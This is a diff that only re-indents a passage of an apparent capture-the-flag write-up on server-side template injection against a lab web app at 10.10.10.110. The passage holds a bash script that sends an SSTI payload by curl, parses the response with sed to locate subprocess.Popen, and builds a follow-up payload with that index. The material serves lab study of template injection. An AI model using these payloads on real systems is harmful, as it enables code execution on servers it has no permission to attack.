@@ -144,39 +144,39 @@ The Orange Juice Bar website uses the same template on every tab. This indicates
 Here is our script:
 
     ```
-#!/bin/bash
+    #!/bin/bash
 
-### STEP 1: Once you see all available classes in the application, copy and paste the website link and use it to make a curl like: 
-    
-step_1=$(curl -o SSTI.txt http://10.10.10.110/feedback/?subject=%7B%7B2022.__class__.__mro__%5B1%5D.__subclasses__%28%29%7D%7D&comments=Nothing%2C+really.%0D%0A%09%09)
-    
-### STEP 2: This 'sed' command replaces each '&lt;' with a new line which is equivalent to adding a new line before each '<'. 
-    
-step_2=$(sed 's/&lt;/\'$'\n/g' SSTI.txt | tee SSTI_1.txt)
-    
-### STEP 3: This 'sed' command deletes every line that doesn't contain 'class &#39;' which is equivalent to the word 'class' and an apostrophe: class '
-    
-step_3=$(sed '/class &#39;/!d' SSTI_1.txt | tee SSTI_2.txt)
+    ### STEP 1: Once you see all available classes in the application, copy and paste the website link and use it to make a curl like: 
+        
+    step_1=$(curl -o SSTI.txt http://10.10.10.110/feedback/?subject=%7B%7B2022.__class__.__mro__%5B1%5D.__subclasses__%28%29%7D%7D&comments=Nothing%2C+really.%0D%0A%09%09)
+        
+    ### STEP 2: This 'sed' command replaces each '&lt;' with a new line which is equivalent to adding a new line before each '<'. 
+        
+    step_2=$(sed 's/&lt;/\'$'\n/g' SSTI.txt | tee SSTI_1.txt)
+        
+    ### STEP 3: This 'sed' command deletes every line that doesn't contain 'class &#39;' which is equivalent to the word 'class' and an apostrophe: class '
+        
+    step_3=$(sed '/class &#39;/!d' SSTI_1.txt | tee SSTI_2.txt)
 
-### STEP 4: This lets you know where `subprocess.Popen' is found. 
-    
-step_4=$(sed -n '/subprocess.Popen/=' SSTI_2.txt)
-    
-sleep 1;
-    
-echo "Performing curl. $step_1"
-    
-echo "Adding new line before each '&lt;'. $step_2" > /dev/null 2>&1
-    
-echo "Only adding lines that include 'class &#39;' to a file. $step_3" > /dev/null 2>&1
-    
-echo -e "Showing which line contains 'subprocess.Popen'. \nThe result is line: $step_4" 
-```
+    ### STEP 4: This lets you know where `subprocess.Popen' is found. 
+        
+    step_4=$(sed -n '/subprocess.Popen/=' SSTI_2.txt)
+        
+    sleep 1;
+        
+    echo "Performing curl. $step_1"
+        
+    echo "Adding new line before each '&lt;'. $step_2" > /dev/null 2>&1
+        
+    echo "Only adding lines that include 'class &#39;' to a file. $step_3" > /dev/null 2>&1
+        
+    echo -e "Showing which line contains 'subprocess.Popen'. \nThe result is line: $step_4" 
+    ```
     The result equals 312. Let's build our latest payload using that index:
 
     ```
-{{2022.__class__.__mro__[1].__subclasses__()[312]}}
-```
+    {{2022.__class__.__mro__[1].__subclasses__()[312]}}
+    ```
 
     And here is the result:
 
